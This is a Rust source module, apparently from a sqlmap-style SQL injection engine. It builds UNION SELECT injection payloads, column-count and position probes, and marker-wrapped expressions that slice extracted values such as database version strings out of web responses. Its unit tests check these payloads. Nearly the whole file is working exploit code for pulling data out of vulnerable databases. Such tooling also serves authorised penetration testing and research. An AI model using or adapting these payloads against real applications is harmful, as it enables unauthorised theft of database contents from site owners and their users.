//! UNION-based extraction: the most reliable `getValue` channel.
//!
//! When the confirmed injection supports a `UNION SELECT`, the target
//! expression is wrapped in the leak markers ([`LEAK_OPEN`]/[`LEAK_CLOSE`]) and
//! placed into a text-compatible column; the value is then sliced straight out
//! of the reflected response body. No inference, one request per value.

use crate::dialects::DialectProfile;
use crate::payload::boundary::Boundary;
use crate::payload::vectors::{leak_wrap, LEAK_CLOSE, LEAK_OPEN};

/// Slice the value the engine reflected between the leak markers.
///
/// Mirrors sqlmap's `kb.chars` boundary scheme: everything between the opening
/// and closing sentinel is the recovered value. Returns `None` when the markers
/// are absent (the column was not reflected, or the channel did not fire).
pub fn slice_marked_value(body: &str) -> Option<String> {
    let start = body.find(LEAK_OPEN)? + LEAK_OPEN.len();
    let rest = &body[start..];
    let end = rest.find(LEAK_CLOSE)?;
    Some(rest[..end].to_string())
}

/// Build the injected parameter value for a UNION leak: a `UNION SELECT` whose
/// `position`-th column (0-based) carries the marker-wrapped expression and
/// whose other columns are `NULL`, spliced under the confirmed boundary.
///
/// A leading space keeps `UNION` separated from a bare quote/paren break-out.
pub fn build_union_payload(
    profile: &DialectProfile,
    boundary: &Boundary,
    columns: usize,
    position: usize,
    expr: &str,
) -> String {
    let columns = columns.max(1);
    let position = position.min(columns - 1);
    let cols: Vec<String> = (0..columns)
        .map(|i| {
            if i == position {
                leak_wrap(profile, expr)
            } else {
                "NULL".to_string()
            }
        })
        .collect();
    let union_sql = format!(" UNION SELECT {}", cols.join(","));
    boundary.render(&union_sql)
}

/// Build a plain column-count probe: `UNION SELECT NULL,NULL,...` with no leak.
/// Used to discover the column count that makes the UNION well-formed.
pub fn build_column_probe(boundary: &Boundary, columns: usize) -> String {
    let nulls = vec!["NULL"; columns.max(1)].join(",");
    boundary.render(&format!(" UNION SELECT {nulls}"))
}

/// Build a per-column position probe: every column carries a distinct marker so
/// whichever appears in the response names the reflected (extractable) column.
pub fn build_position_probe(boundary: &Boundary, columns: usize) -> String {
    let marks: Vec<String> = (0..columns.max(1))
        .map(|i| format!("'{LEAK_OPEN}{i}{LEAK_CLOSE}'"))
        .collect();
    boundary.render(&format!(" UNION SELECT {}", marks.join(",")))
}

/// Given a body from a position probe, return the 0-based column index whose
/// marker was reflected, if any.
pub fn reflected_position(body: &str, columns: usize) -> Option<usize> {
    (0..columns.max(1)).find(|i| body.contains(&format!("{LEAK_OPEN}{i}{LEAK_CLOSE}")))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::detection::DbmsFamily;
    use crate::dialects::profile;

    #[test]
    fn slices_value_from_marked_body() {
        let body = "<html>...qpvzq5.7.42-log-MySQLqkxbq...</html>";
        assert_eq!(slice_marked_value(body).as_deref(), Some("5.7.42-log-MySQL"));
    }

    #[test]
    fn missing_markers_recover_nothing() {
        assert_eq!(slice_marked_value("<html>no marker here</html>"), None);
    }

    #[test]
    fn union_payload_places_leak_at_requested_position() {
        let p = profile(DbmsFamily::PostgreSQL);
        let payload = build_union_payload(&p, &Boundary::numeric(), 3, 1, "version()");
        // Pipes concat, leak wrapped, in column 1 of 3.
        assert!(payload.contains("'qpvzq'||(version())||'qkxbq'"), "got {payload}");
        assert!(payload.contains("NULL,'qpvzq"), "leak not in second column: {payload}");
        assert!(payload.contains("UNION SELECT"), "got {payload}");
    }

    #[test]
    fn position_probe_round_trips_through_reflected_position() {
        let payload = build_position_probe(&Boundary::single_quoted(), 4);
        assert!(payload.contains("qpvzq2qkxbq"), "got {payload}");
        // A body echoing the column-2 marker names column 2.
        let body = format!("row: qpvzq2qkxbq");
        assert_eq!(reflected_position(&body, 4), Some(2));
    }
}
